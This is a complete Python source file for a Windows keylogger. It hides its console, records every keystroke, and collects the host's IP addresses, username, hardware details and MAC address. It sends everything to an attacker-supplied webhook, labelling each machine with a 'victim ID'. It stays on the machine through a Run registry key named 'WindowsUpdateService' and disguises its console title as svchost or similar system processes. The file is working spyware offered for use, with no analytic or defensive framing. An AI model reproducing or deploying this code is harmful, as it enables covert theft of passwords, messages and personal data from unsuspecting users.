import os
import requests
from pynput import keyboard
import time
import ctypes
import random
import sys
import threading
import socket
import subprocess
import winreg
import uuid
import platform
import json

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

WEBHOOK_URL = "ENTER_YOUR_WEBHOOK_HERE"
BUFFER_TIME = 60
MAX_BUFFER_SIZE = 500

current_word = ''
log_buffer = []
last_send_time = time.time()
victim_id = str(uuid.uuid4())
system_info_sent = False

key_map = {
    keyboard.Key.up: '[UP]',
    keyboard.Key.down: '[DOWN]',
    keyboard.Key.left: '[LEFT]',
    keyboard.Key.right: '[RIGHT]',
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '[ENTER]\n',
    keyboard.Key.tab: '[TAB]',
    keyboard.Key.backspace: '[BACKSPACE]',
    keyboard.Key.esc: '[ESC]',
    keyboard.Key.delete: '[DEL]',
    keyboard.Key.caps_lock: '[CAPS]',
    keyboard.Key.shift: '',
    keyboard.Key.shift_r: '',
    keyboard.Key.ctrl: '',
    keyboard.Key.ctrl_r: '',
    keyboard.Key.alt: '',
    keyboard.Key.alt_r: '',
    keyboard.Key.cmd: '[WIN]',
    keyboard.Key.cmd_r: '[WIN]',
    keyboard.Key.f1: '[F1]',
    keyboard.Key.f2: '[F2]',
    keyboard.Key.f3: '[F3]',
    keyboard.Key.f4: '[F4]',
    keyboard.Key.f5: '[F5]',
    keyboard.Key.f6: '[F6]',
    keyboard.Key.f7: '[F7]',
    keyboard.Key.f8: '[F8]',
    keyboard.Key.f9: '[F9]',
    keyboard.Key.f10: '[F10]',
    keyboard.Key.f11: '[F11]',
    keyboard.Key.f12: '[F12]',
}

def get_public_ip():
    """Get public IP address using multiple fallback services"""
    services = [
        'https://api.ipify.org',
        'https://ipinfo.io/ip',
        'https://checkip.amazonaws.com',
        'https://icanhazip.com'
    ]
    
    for service in services:
        try:
            response = requests.get(service, timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            continue
    return "Unknown"

def get_system_info():
    """Collect detailed system information"""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = get_public_ip()
        username = os.getlogin()
        os_info = platform.platform()
        
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                        for elements in range(0,2*6,2)][::-1])
        
        cpu_info = subprocess.check_output(
            'wmic cpu get name', 
            shell=True, 
            stderr=subprocess.DEVNULL, 
            stdin=subprocess.DEVNULL
        ).decode().split('\n')[1].strip()
        
        gpu_info = subprocess.check_output(
            'wmic path win32_VideoController get name',
            shell=True,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        ).decode().split('\n')[1].strip()
        
        ram_info = subprocess.check_output(
            'wmic ComputerSystem get TotalPhysicalMemory',
            shell=True,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        ).decode().split('\n')[1].strip()
        ram_gb = round(int(ram_info) / (1024 ** 3), 1)
        
        return {
            "victim_id": victim_id,
            "hostname": hostname,
            "local_ip": local_ip,
            "public_ip": public_ip,
            "username": username,
            "os": os_info,
            "cpu": cpu_info,
            "gpu": gpu_info,
            "ram": f"{ram_gb} GB",
            "mac": mac,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
    except:
        return {
            "victim_id": victim_id,
            "error": "Failed to collect system information"
        }

def send_data(data, is_info=False):
    """Send data to webhook with error handling"""
    try:
        payload = {
            "content": None,
            "embeds": [] if is_info else None
        }
        
        if is_info:
            embed = {
                "title": "💻 System Information",
                "color": 0x3498db,
                "fields": [],
                "footer": {"text": f"Victim ID: {victim_id}"}
            }
            
            for key, value in data.items():
                embed["fields"].append({
                    "name": key.upper(),
                    "value": str(value),
                    "inline": True
                })
                
            payload["embeds"].append(embed)
        else:
            payload["content"] = f"```\n{data}\n```"
        
        headers = {"Content-Type": "application/json"}
        response = requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=10)
        return response.status_code == 204
    except:
        return False

def buffer_log(data):
    """Add log to buffer and send if conditions met"""
    global log_buffer, last_send_time, system_info_sent
    
    if data:
        log_buffer.append(data)
    
    current_time = time.time()
    buffer_full = len(''.join(log_buffer)) > MAX_BUFFER_SIZE
    time_elapsed = current_time - last_send_time > BUFFER_TIME
    
    if (buffer_full or time_elapsed) and log_buffer:
        if not system_info_sent:
            sys_info = get_system_info()
            if send_data(sys_info, is_info=True):
                system_info_sent = True
        
        log_data = ''.join(log_buffer)
        if send_data(f"[{victim_id}]\n{log_data}"):
            log_buffer = []
            last_send_time = current_time

def persist():
    """Establish persistence via registry startup"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, 
            key_path, 
            0, 
            winreg.KEY_WRITE
        ) as key:
            winreg.SetValueEx(
                key, 
                "WindowsUpdateService", 
                0, 
                winreg.REG_SZ, 
                f'"{sys.executable}" "{script_path}"'
            )
        return True
    except:
        return False

def set_stealth():
    """Set stealthy process name and attributes"""
    try:
        names = ["svchost", "runtimebroker", "dllhost", "taskhostw", "ctfmon"]
        process_name = f"{random.choice(names)}_{random.randint(1000, 9999)}"
        ctypes.windll.kernel32.SetConsoleTitleW(process_name)
        
        ctypes.windll.kernel32.SetPriorityClass(
            ctypes.windll.kernel32.GetCurrentProcess(),
            0x00000040  
        )
        return True
    except:
        return False

def on_press(key):
    """Handle key press events"""
    global current_word
    
    try:
        if key in key_map:
            char = key_map[key]
            if char:
                if char == '[BACKSPACE]' and current_word:
                    current_word = current_word[:-1]
                else:
                    if current_word:
                        buffer_log(current_word)
                        current_word = ''
                    buffer_log(char)
            return
        
        char = getattr(key, 'char', None)
        if char:
            if char in ' \t\n\r.,;:!?()[]{}/\\\'"':
                if current_word:
                    buffer_log(current_word + char)
                    current_word = ''
                else:
                    buffer_log(char)
            else:
                current_word += char
        else:
            buffer_log(f'[{key}]')
            
    except Exception as e:
        pass

def on_release(key):
    """Handle key release events"""
    if key == keyboard.Key.esc:
        return False

def main():
    """Main execution function"""
    set_stealth()
    
    persist()
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
